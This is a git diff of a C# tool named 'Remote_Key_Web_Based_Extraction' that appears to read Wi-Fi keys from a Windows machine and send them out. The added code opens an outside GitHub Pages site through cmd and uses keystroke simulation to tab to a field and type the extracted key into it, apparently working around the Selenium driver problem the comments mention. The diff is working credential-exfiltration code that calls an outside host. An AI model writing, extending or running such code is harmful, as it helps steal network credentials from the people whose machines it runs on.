@@ -3,6 +3,8 @@ using Windows.Devices.WiFi;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.Management.Automation;
+using WindowsInput;
+using System.Windows.Input;
 using System.Net.Http;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
@@ -26,8 +28,8 @@ namespace Remote_Key_Web_Based_Extraction
             ap_extraction_task.Wait();
             string key_content = main_program.local_key_content_extraction();
             Console.WriteLine("Opportunity to obfuscate key_content:");
-            string obfuscation = Console.ReadLine();
-            key_content += obfuscation;
+            //string obfuscation = Console.ReadLine();
+            //key_content += obfuscation;
             main_program.web_content_key_extraction(key_content);
         }
 
@@ -74,8 +76,23 @@ namespace Remote_Key_Web_Based_Extraction
 
         public void web_content_key_extraction(string key_content)
         {
-            Process.Start("http://www.google.com");
-            //System.Diagnostics.Process.Start("http://testwebsite1/");
+
+            // System.Diagnostics.Process.Start(string fileName, string arguments);
+
+            //https://stackoverflow.com/questions/49529559/cant-open-link-in-c-sharp
+            System.Diagnostics.Process.Start("cmd", "/c start https://anthony-t-n.github.io");
+
+            // https://stackoverflow.com/questions/25987445/installed-inputsimulator-via-nuget-no-members-accessible
+            InputSimulator s = new InputSimulator();
+
+            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.F5);
+            // 22 tab presses
+            for (int i = 0; i <= 22; i++)
+            {
+                s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.TAB);
+            }
+            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.VK_4);
+            s.Keyboard.TextEntry(key_content);
 
             // Issues with Selenium. Requires driver executables on target device.
             /*
@@ -117,3 +134,5 @@ namespace Remote_Key_Web_Based_Extraction
 
             */
         }
+    }
+}
